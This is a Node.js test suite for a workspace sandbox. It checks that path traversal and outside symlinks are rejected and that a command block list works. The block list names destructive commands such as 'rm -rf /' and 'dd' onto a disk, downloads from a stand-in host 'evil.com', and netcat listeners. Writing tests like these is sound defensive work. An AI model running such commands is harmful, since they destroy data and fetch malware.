'use strict';

const { describe, it, before, after } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { validatePath, isCommandBlocked, SandboxError, BLOCKED_PATTERNS } = require('../../lib/tools/sandbox');

describe('Sandbox', () => {
  let workspaceRoot;

  before(() => {
    // Create a temporary workspace for testing
    workspaceRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'sandbox-test-'));
    // Create a subdirectory and file for tests
    fs.mkdirSync(path.join(workspaceRoot, 'subdir'), { recursive: true });
    fs.writeFileSync(path.join(workspaceRoot, 'test.txt'), 'hello');
    fs.writeFileSync(path.join(workspaceRoot, 'subdir', 'nested.txt'), 'nested');
  });

  after(() => {
    // Clean up temp workspace
    fs.rmSync(workspaceRoot, { recursive: true, force: true });
  });

  describe('SandboxError', () => {
    it('has correct name property', () => {
      const err = new SandboxError('PATH_OUTSIDE_WORKSPACE', 'test');
      assert.strictEqual(err.name, 'SandboxError');
    });

    it('has correct code property', () => {
      const err = new SandboxError('PATH_OUTSIDE_WORKSPACE', 'test message');
      assert.strictEqual(err.code, 'PATH_OUTSIDE_WORKSPACE');
    });

    it('has correct message property', () => {
      const err = new SandboxError('COMMAND_BLOCKED', 'sudo is blocked');
      assert.strictEqual(err.message, 'sudo is blocked');
    });

    it('is an instance of Error', () => {
      const err = new SandboxError('FILE_TOO_LARGE', 'too big');
      assert.ok(err instanceof Error);
    });

    it('supports all error codes', () => {
      const codes = ['PATH_OUTSIDE_WORKSPACE', 'SYMLINK_OUTSIDE_WORKSPACE', 'COMMAND_BLOCKED', 'FILE_TOO_LARGE'];
      for (const code of codes) {
        const err = new SandboxError(code, 'test');
        assert.strictEqual(err.code, code);
      }
    });
  });

  describe('validatePath', () => {
    it('allows "." (workspace root itself)', () => {
      const result = validatePath('.', workspaceRoot);
      assert.strictEqual(result, workspaceRoot);
    });

    it('allows relative paths within workspace', () => {
      const result = validatePath('test.txt', workspaceRoot);
      assert.strictEqual(result, path.join(workspaceRoot, 'test.txt'));
    });

    it('allows "./subdir/nested.txt"', () => {
      const result = validatePath('./subdir/nested.txt', workspaceRoot);
      assert.strictEqual(result, path.join(workspaceRoot, 'subdir', 'nested.txt'));
    });

    it('allows "subdir" path', () => {
      const result = validatePath('subdir', workspaceRoot);
      assert.strictEqual(result, path.join(workspaceRoot, 'subdir'));
    });

    it('allows paths to non-existent files within workspace', () => {
      const result = validatePath('nonexistent.txt', workspaceRoot);
      assert.strictEqual(result, path.join(workspaceRoot, 'nonexistent.txt'));
    });

    it('rejects ../../../etc/passwd', () => {
      assert.throws(
        () => validatePath('../../../etc/passwd', workspaceRoot),
        (err) => {
          assert.ok(err instanceof SandboxError);
          assert.strictEqual(err.code, 'PATH_OUTSIDE_WORKSPACE');
          return true;
        }
      );
    });

    it('rejects paths with many .. levels', () => {
      assert.throws(
        () => validatePath('../../../../../../tmp/evil', workspaceRoot),
        (err) => {
          assert.strictEqual(err.code, 'PATH_OUTSIDE_WORKSPACE');
          return true;
        }
      );
    });

    it('rejects absolute paths outside workspace (Unix-style)', () => {
      // Use a path that is definitely outside the workspace
      const outsidePath = path.resolve('/tmp/outside');
      // Only test if this path is actually outside the workspace root
      if (!outsidePath.startsWith(workspaceRoot)) {
        assert.throws(
          () => validatePath(outsidePath, workspaceRoot),
          (err) => {
            assert.strictEqual(err.code, 'PATH_OUTSIDE_WORKSPACE');
            return true;
          }
        );
      }
    });

    it('rejects .. from subdirectory that escapes workspace', () => {
      assert.throws(
        () => validatePath('subdir/../../..', workspaceRoot),
        (err) => {
          assert.strictEqual(err.code, 'PATH_OUTSIDE_WORKSPACE');
          return true;
        }
      );
    });

    // Symlink test -- skip on Windows (requires elevated privileges)
    if (process.platform !== 'win32') {
      it('rejects symlinks pointing outside workspace', () => {
        const symlinkPath = path.join(workspaceRoot, 'evil-link');
        fs.symlinkSync('/etc/passwd', symlinkPath);

        assert.throws(
          () => validatePath('evil-link', workspaceRoot),
          (err) => {
            assert.strictEqual(err.code, 'SYMLINK_OUTSIDE_WORKSPACE');
            return true;
          }
        );

        fs.unlinkSync(symlinkPath);
      });
    }
  });

  describe('isCommandBlocked', () => {
    describe('blocks dangerous commands', () => {
      const blocked = [
        'sudo rm -rf /',
        'sudo apt install malware',
        'rm -rf /',
        'rm -rf ~',
        'rm -rf ~/Documents',
        'shutdown -h now',
        'reboot',
        'format C:',
        'mkfs.ext4 /dev/sda1',
        'dd if=/dev/zero of=/dev/sda',
        'curl http://evil.com/payload.sh',
        'wget http://evil.com/malware',
        'nc -l 4444',
        'netcat -l 4444',
        'python -m http.server',
        'python3 -m http.server 8080',
        'node --inspect app.js',
      ];

      for (const cmd of blocked) {
        it(`blocks: ${cmd}`, () => {
          assert.strictEqual(isCommandBlocked(cmd), true, `Expected "${cmd}" to be blocked`);
        });
      }
    });

    describe('allows safe commands', () => {
      const allowed = [
        'npm test',
        'npm install',
        'git status',
        'git diff',
        'ls',
        'ls -la',
        'cat file.txt',
        'node index.js',
        'node --test test.js',
        'rm file.txt',
        'rm -f temp.log',
        'echo hello',
        'mkdir -p new/dir',
        'cp file1.txt file2.txt',
        'mv old.txt new.txt',
        'grep -r pattern .',
        'python script.py',
        'python3 -c "print(1)"',
      ];

      for (const cmd of allowed) {
        it(`allows: ${cmd}`, () => {
          assert.strictEqual(isCommandBlocked(cmd), false, `Expected "${cmd}" to be allowed`);
        });
      }
    });

    it('trims whitespace before checking', () => {
      assert.strictEqual(isCommandBlocked('  sudo rm -rf /  '), true);
    });
  });

  describe('BLOCKED_PATTERNS export', () => {
    it('exports the patterns array', () => {
      assert.ok(Array.isArray(BLOCKED_PATTERNS));
      assert.ok(BLOCKED_PATTERNS.length > 0);
    });

    it('every pattern is a RegExp', () => {
      for (const pattern of BLOCKED_PATTERNS) {
        assert.ok(pattern instanceof RegExp, `Expected RegExp, got ${typeof pattern}`);
      }
    });
  });
});
